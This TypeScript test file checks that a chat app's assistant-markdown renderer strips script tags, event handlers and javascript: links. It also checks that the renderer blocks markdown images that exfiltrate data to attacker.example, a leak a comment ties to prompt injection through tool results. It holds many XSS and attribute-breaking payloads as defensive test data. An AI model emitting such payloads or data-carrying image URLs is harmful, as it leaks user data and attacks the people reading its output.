/**
 * End-to-end assistant markdown rendering (ChatMessages.renderAssistantMarkdown):
 * markdown → marked → sanitizer, with the entity/reference annotation running
 * INSIDE the sanitizer, on its inert DOM, before the image pass (#428).
 *
 * The assistant's markdown carries tool-result content verbatim (mail bodies,
 * document text), so these cases feed markup through the whole pipeline and
 * assert both halves: nothing executable reaches the returned HTML, and the
 * annotation spans + ordinary markdown still come out the other side.
 *
 * Attribute assertions go through the DOM rather than string matching — the
 * rendered HTML is assigned to `innerHTML`, so "did this become an attribute"
 * is the question that matters, not "does this substring appear".
 */
import { describe, it, expect } from 'vitest'
import type { RetrievalReference } from '@hames-ai/harness-patterns/patterns/retriever.server'
import { sanitizeMarkdownHtml } from '~/lib/sanitize-html'

const { renderAssistantMarkdown } = await import('~/components/ark-ui/ChatMessages')

const noEntities = new Map<string, string[]>()

const reference = (source: string, docId = 'doc-1'): RetrievalReference => ({
  source,
  docId,
  chunkIndex: 0,
  startOffset: 0,
  endOffset: 10,
})

/** Mount rendered HTML the way ChatMessages does, so attributes are real. */
const mount = (html: string): HTMLDivElement => {
  const host = document.createElement('div')
  host.innerHTML = html
  return host
}

/** Every attribute name present anywhere in the rendered fragment. */
const attributeNames = (host: HTMLElement): string[] =>
  [...host.querySelectorAll('*')].flatMap((el) => [...el.attributes].map((a) => a.name))

describe('renderAssistantMarkdown — markup carried in model output', () => {
  it('strips script elements embedded in the message', () => {
    const out = renderAssistantMarkdown(
      'Here is the mail body:\n\n<script>window.stolen = 1</script>\n\nDone.',
      noEntities,
      [],
    )
    expect(out).not.toContain('<script')
    expect(out).not.toContain('window.stolen')
    expect(out).toContain('Done.')
    expect(mount(out).querySelector('script')).toBeNull()
  })

  it('strips onerror handlers from images but keeps the image', () => {
    // A source the sanitizer allows (the Data Stash download route), so the
    // image survives and this stays a test of the handler strip. It was
    // `x.png` until #415 D13 refused every other source.
    const src = '/api/stash/document/doc-1?sessionId=s1&download'
    const out = renderAssistantMarkdown(
      `<img src="${src}" onerror="window.stolen = 1">`,
      noEntities,
      [],
    )
    const img = mount(out).querySelector('img')
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe(src)
    expect(img!.hasAttribute('onerror')).toBe(false)
  })

  it('neutralises javascript: links written as markdown', () => {
    const out = renderAssistantMarkdown('[click me](javascript:window.stolen=1)', noEntities, [])
    expect(out).not.toContain('javascript:')
    expect(mount(out).querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript:')
    expect(out).toContain('click me')
  })

  it('leaves the ordinary markdown feature set intact', () => {
    const md = [
      '## Report',
      '',
      '**bold** and *italic* and `inline`',
      '',
      '```js',
      'const a = 1',
      '```',
      '',
      '| col | val |',
      '| :-- | --: |',
      '| a   | 1   |',
      '',
      '- item one',
      '- item two',
      '',
      '> quoted',
      '',
      '[docs](https://example.test/docs)',
    ].join('\n')
    const out = renderAssistantMarkdown(md, noEntities, [])

    expect(out).toContain('<h2>Report</h2>')
    expect(out).toContain('<strong>bold</strong>')
    expect(out).toContain('<em>italic</em>')
    expect(out).toContain('<code>inline</code>')
    expect(out).toContain('class="language-js"')
    expect(out).toContain('const a = 1')
    expect(out).toContain('<table>')
    expect(out).toContain('align="left"')
    expect(out).toContain('<li>item one</li>')
    expect(out).toContain('<blockquote>')
    expect(out).toContain('href="https://example.test/docs"')
  })
})

describe('renderAssistantMarkdown — a remote image in the answer does not load (#415 D13)', () => {
  // The finding, end to end: an injected instruction makes the model print a
  // markdown image whose URL carries data, and rendering the answer used to
  // fetch it. Every markdown spelling of an image goes through marked's `<img>`,
  // so each is asserted through the whole pipeline rather than at the sanitizer.
  const exfil = 'https://attacker.example/p.png?d=Q3-payroll-total'
  const spellings: Array<[string, string]> = [
    ['an inline image', `Summary done. ![chart](${exfil})`],
    ['a reference-style image', `Summary done. ![chart][r]\n\n[r]: ${exfil}`],
    ['an image inside a link', `[![badge](${exfil})](https://example.test/)`],
    ['a raw <img> in the answer', `Summary done. <img src="${exfil}">`],
  ]

  it.each(spellings)('%s renders as a placeholder, never an <img>', (_label, md) => {
    const host = mount(renderAssistantMarkdown(md, noEntities, []))

    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector('span.blocked-image')
    expect(placeholder?.textContent).toBe(`Image blocked: ${exfil}`)
    // No attribute anywhere still carries the URL — the anchor's href in the
    // link case is a different URL, and loads only on a click.
    expect(attributeNames(host)).not.toContain('src')
    expect(host.innerHTML).not.toMatch(/(src|srcset|style)="[^"]*attacker/)
  })

  it('survives entity annotation, which runs before the image pass', () => {
    // The annotators wrap text nodes of the sanitized DOM. The image pass runs
    // after them, so nothing they do can bring an image back.
    const host = mount(
      renderAssistantMarkdown(`Acme results ![x](${exfil})`, new Map([['Acme', ['n1']]]), []),
    )

    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('span.blocked-image')).not.toBeNull()
    expect(host.querySelector('.graph-entity')?.textContent).toBe('Acme')
  })
})

describe('renderAssistantMarkdown — links open in a new tab', () => {
  // The standing UI rule reaches the chat through the sanitizer hook, so this
  // asserts it end to end: a plain markdown link comes out of the pipeline
  // ready to open elsewhere, with the `window.opener` hole closed. The
  // repo-wide guard for hand-written anchors is `src/__tests__/links-new-tab.test.ts`.
  it('stamps target and rel on a markdown link', () => {
    const link = mount(
      renderAssistantMarkdown('See [the docs](https://example.test/docs).', noEntities, []),
    ).querySelector('a')

    expect(link).not.toBeNull()
    expect(link!.getAttribute('target')).toBe('_blank')
    expect(link!.getAttribute('rel')).toBe('noopener noreferrer')
    expect(link!.getAttribute('href')).toBe('https://example.test/docs')
  })

  it('stamps them on a raw anchor carried in the model output too', () => {
    const link = mount(
      renderAssistantMarkdown(
        'From the mail body: <a href="https://example.test/x" target="_self">x</a>',
        noEntities,
        [],
      ),
    ).querySelector('a')

    expect(link!.getAttribute('target')).toBe('_blank')
    expect(link!.getAttribute('rel')).toBe('noopener noreferrer')
  })
})

describe('renderAssistantMarkdown — annotation spans', () => {
  it('annotates known entity names and keeps the span hooks', () => {
    const entities = new Map<string, string[]>([['Acme Corp', ['n1', 'n2']]])
    const span = mount(
      renderAssistantMarkdown('We looked into Acme Corp today.', entities, []),
    ).querySelector('.graph-entity')

    expect(span).not.toBeNull()
    expect(span!.getAttribute('data-entity-name')).toBe('Acme Corp')
    expect(span!.getAttribute('data-entity-ids')).toBe('n1,n2')
    expect(span!.textContent).toBe('Acme Corp')
  })

  it('annotates cited filenames and keeps the citation superscript', () => {
    const host = mount(
      renderAssistantMarkdown('See notes.md for the detail.', noEntities, [reference('notes.md')]),
    )
    const span = host.querySelector('.doc-ref')

    expect(span).not.toBeNull()
    expect(span!.getAttribute('data-doc-id')).toBe('doc-1')
    expect(span!.getAttribute('title')).toBe('Open notes.md in viewer')
    // The mark is an empty <sup> carrying an icon utility class — it was a "↗"
    // character until the emoji sweep, so an empty textContent is the point.
    const mark = host.querySelector('sup.doc-ref-mark')
    expect(mark?.textContent).toBe('')
    expect(mark?.classList.contains('i-material-symbols-arrow-outward')).toBe(true)
  })

  it('escapes a quote in a document id instead of letting it open a new attribute', () => {
    const docId = 'doc" onmouseover="window.stolen=1'
    const host = mount(
      renderAssistantMarkdown('See notes.md for the detail.', noEntities, [
        reference('notes.md', docId),
      ]),
    )

    expect(host.querySelector('.doc-ref')?.getAttribute('data-doc-id')).toBe(docId)
    expect(attributeNames(host)).not.toContain('onmouseover')
  })

  // The filename lands in the citation `title`. It used to be escaped into an
  // interpolated string; since #428 the annotator sets the attribute through
  // the DOM, so there is no escaper left to pin. What holds either way, and is
  // pinned here, is the outcome: the value arrives verbatim, as one attribute.
  it('carries a quote in a filename into the citation title as a value, not markup', () => {
    const source = 'q1" onmouseover="window.stolen=1" x="report.pdf'
    const host = mount(
      renderAssistantMarkdown(`Summary of ${source} attached.`, noEntities, [reference(source)]),
    )

    expect(host.querySelector('.doc-ref')?.getAttribute('title')).toBe(`Open ${source} in viewer`)
    expect(attributeNames(host)).not.toContain('onmouseover')
    expect(attributeNames(host)).not.toContain('x')
  })

  it('escapes quotes in entity ids instead of letting them open a new attribute', () => {
    const entities = new Map<string, string[]>([['Acme', ['n1" onmouseover="window.stolen=1']]])
    const host = mount(renderAssistantMarkdown('We looked into Acme today.', entities, []))

    expect(host.querySelector('.graph-entity')?.getAttribute('data-entity-ids')).toBe(
      'n1" onmouseover="window.stolen=1',
    )
    expect(attributeNames(host)).not.toContain('onmouseover')
  })
})

// ============================================================================
// #428: annotation must never re-parse the sanitized HTML
// ============================================================================
//
// The annotators used to run on the sanitizer's SERIALIZED output. They split
// it with `/(<[^>]+>)/` and rewrote the "text" pieces, which assumes no `>`
// inside an attribute value. jsdom (this layer) serializes `<` and `>` in
// attribute values raw. So a `>` in a title or alt made the tail of the
// attribute look like text, and the annotator's own `"` then closed the
// attribute. Whatever the sanitizer had judged an attribute STRING came back
// as live markup: an `<img>` the image pass never saw, and an anchor that lost
// the `target`/`rel` the link rule stamps. Current Chromium, WebKit and
// Firefox escape both characters there. Older engines do not.
//
// Each payload below is asserted three ways, all through the DOM:
//   - no element loads the attacker host;
//   - every link still carries the link rule's `target` and `rel`;
//   - with the annotation spans unwrapped, the fragment is EXACTLY what the
//     sanitizer produced for the same answer with nothing to annotate. In
//     other words, annotation wrapped text and changed nothing else.

const ATTACKER = 'attacker.example'
const STASH_IMAGE = '/api/stash/document/doc-1?sessionId=s1&download'
const acme = new Map<string, string[]>([['Acme', ['n1']]])

/** The fragment with every annotation span unwrapped and its mark removed. */
const withoutAnnotations = (host: HTMLElement): string => {
  host.querySelectorAll('sup.doc-ref-mark').forEach((mark) => mark.remove())
  host
    .querySelectorAll('span.graph-entity, span.doc-ref')
    .forEach((span) => span.replaceWith(...span.childNodes))
  return host.innerHTML
}

/** Every element in the fragment whose `src` would fetch from the attacker. */
const attackerLoads = (host: HTMLElement): string[] =>
  [...host.querySelectorAll('[src]')]
    .filter((el) => el.getAttribute('src')!.includes(ATTACKER))
    .map((el) => el.outerHTML)

describe('renderAssistantMarkdown: annotation cannot turn an attribute back into markup (#428)', () => {
  it('runs where the hazard is real: jsdom still leaves `>` raw in an attribute value', () => {
    // Positive control. The payloads below discriminate only while this holds.
    // If a jsdom upgrade starts escaping `>` here, a restored regex split
    // would pass them, so delete or replace them then. The decoded-text cases
    // in the next block do not depend on the serializer and keep
    // discriminating.
    expect(sanitizeMarkdownHtml('<span title="a>b">x</span>')).toContain('title="a>b"')
  })

  const payloads: Array<[string, string, Map<string, string[]>, RetrievalReference[]]> = [
    [
      'the issue payload: a link title holding `>` and an entity name',
      `[ok](https://ok.test/ "x>Acme <img src=https://${ATTACKER}/p.png?d=S>")`,
      acme,
      [],
    ],
    [
      'the same through a cited filename',
      `[ok](https://ok.test/ "x>report.pdf <img src=https://${ATTACKER}/p.png?d=S>")`,
      noEntities,
      [reference('report.pdf')],
    ],
    [
      'alt text on an allowed stash image',
      `![x>Acme <img src=https://${ATTACKER}/p.png?d=S>](${STASH_IMAGE})`,
      acme,
      [],
    ],
    [
      'a raw element other than a link, holding `>` in its title',
      `<span title="x>Acme <img src=//${ATTACKER}/s.png>">y</span>`,
      acme,
      [],
    ],
    [
      'entity-encoded tags in a markdown title',
      `[ok](https://ok.test/ "x&gt;Acme &lt;img src=https://${ATTACKER}/p.png?d=S&gt;")`,
      acme,
      [],
    ],
    [
      'entity-encoded tags in a raw anchor title, decimal and hex',
      `<a href="https://ok.test/" title="x&gt;Acme &#60;img src=//${ATTACKER}/p.png&#x3e;">ok</a>`,
      acme,
      [],
    ],
    [
      'a tag opened before a citation chip and closed by the anchor after it',
      `[ok](https://ok.test/ "x>report.pdf <img src=//${ATTACKER}/p.png?d=S")`,
      noEntities,
      [reference('report.pdf')],
    ],
    [
      'a tag opened before an entity span and closed by the anchor after it',
      `[ok](https://ok.test/ "x>Acme <img src=//${ATTACKER}/p.png?d=S")`,
      acme,
      [],
    ],
    [
      'nested quotes in a single-quoted raw title',
      `<a href="https://ok.test/" title='x>Acme "y" <img src=//${ATTACKER}/q.png>'>ok</a>`,
      acme,
      [],
    ],
    [
      'nested quotes in a markdown title',
      `[ok](https://ok.test/ 'x>Acme "y" <img src=//${ATTACKER}/q.png>')`,
      acme,
      [],
    ],
    [
      'both annotators inside one attribute',
      `[ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
      acme,
      [reference('report.pdf')],
    ],
  ]

  it.each(payloads)('%s', (_label, md, entities, references) => {
    const host = mount(renderAssistantMarkdown(md, entities, references))
    const plain = mount(renderAssistantMarkdown(md, noEntities, [])).innerHTML

    expect(attackerLoads(host)).toEqual([])
    for (const a of host.querySelectorAll('a')) {
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    }
    expect(withoutAnnotations(host)).toBe(plain)
  })

  it('still annotates the prose beside a hostile attribute', () => {
    const host = mount(
      renderAssistantMarkdown(
        `Acme and report.pdf: [ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
        acme,
        [reference('report.pdf')],
      ),
    )

    // One of each, both in the paragraph's own text, none inside the anchor.
    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['Acme'])
    expect([...host.querySelectorAll('.doc-ref')].map((s) => s.textContent)).toEqual(['report.pdf'])
    expect(host.querySelector('a .graph-entity, a .doc-ref')).toBeNull()
    expect(host.querySelector('a')!.getAttribute('title')).toBe(
      `x>Acme report.pdf <img src=//${ATTACKER}/b.png>`,
    )
  })
})

describe('renderAssistantMarkdown: annotation reads the text the reader sees (#428)', () => {
  // These do not depend on how jsdom serializes attributes. A pass over the
  // serialized string sees `&lt;` and `&amp;` where the reader sees `<` and
  // `&`, so it splits character references and misses names that contain one.

  it('does not split a character reference that spells an entity name', () => {
    const host = mount(
      renderAssistantMarkdown(
        `if a &lt;img src=//${ATTACKER}/x&gt; b then lt wins`,
        new Map([
          ['lt', ['n1']],
          ['gt', ['n2']],
        ]),
        [],
      ),
    )

    expect(host.querySelector('p')!.textContent).toBe(
      `if a <img src=//${ATTACKER}/x> b then lt wins`,
    )
    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['lt'])
    expect(host.querySelector('img')).toBeNull()
  })

  it('annotates a name that contains an ampersand', () => {
    const host = mount(renderAssistantMarkdown('AT&T reported.', new Map([['AT&T', ['n1']]]), []))

    expect(host.querySelector('.graph-entity')?.getAttribute('data-entity-name')).toBe('AT&T')
    expect(host.querySelector('p')!.textContent).toBe('AT&T reported.')
  })

  it('leaves the text of a refused image alone: the placeholder is built after annotation', () => {
    const host = mount(
      renderAssistantMarkdown(`Acme: ![c](https://${ATTACKER}/Acme.png)`, acme, []),
    )

    expect(host.querySelector('.blocked-image')?.textContent).toBe(
      `Image blocked: https://${ATTACKER}/Acme.png`,
    )
    expect(host.querySelector('.blocked-image .graph-entity')).toBeNull()
    expect(host.querySelectorAll('.graph-entity')).toHaveLength(1)
  })

  it('leaves a match the name lookup cannot resolve as text, rather than throwing', () => {
    // The regex's `i` flag matches final sigma against σ; `toLowerCase` does not.
    const host = mount(renderAssistantMarkdown('Aςb and Aσb', new Map([['Aσ', ['n1']]]), []))

    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['Aσ'])
    expect(host.querySelector('p')!.textContent).toBe('Aςb and Aσb')
  })

  it('skips code spans and code blocks, as before', () => {
    const host = mount(renderAssistantMarkdown('Acme `Acme` and\n\n```\nAcme\n```', acme, []))

    expect(
      [...host.querySelectorAll('.graph-entity')].map((s) => s.parentElement!.nodeName),
    ).toEqual(['P'])
  })
})
